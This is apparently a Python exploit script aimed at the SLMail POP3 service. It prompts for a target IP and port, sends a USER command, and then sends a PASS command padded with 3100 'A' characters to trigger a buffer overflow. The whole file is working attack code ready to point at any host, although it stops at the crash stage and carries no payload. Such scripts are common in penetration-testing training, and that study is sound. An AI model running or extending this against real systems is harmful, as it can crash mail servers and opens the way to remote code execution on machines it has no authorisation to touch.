#!/usr/bin/python3

from time import sleep
import sys,socket

print("**********SLMAIL POP3 vulnerability**********")
sleep(0.5)
ip_address=input("Enter the IP address:\n")
port_number=input("Enter the Port number:\n")

if(len(ip_address)<=0) or (len(port_number)<=0):
    if(len(ip_address)>0) and (len(port_number)<=0):
        print("*"*25)
        print("Port number field is empty")
    elif(len(ip_address)<=0) and (len(port_number)>0):
        print("*"*25)
        print("IP addres field is empty")
    else:
        print("*"*25)
        print("Issues with the user input")

elif(len(ip_address)>0) and (len(port_number)>0):
    print("*"*25)
    buffer=3100
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    print("Sending buffer -->" + str(buffer))
    s.send((b"USER TEST\r\n"))
    s.send((b"PASS " + b"A" *buffer + b"\r\n"))
    s.close()
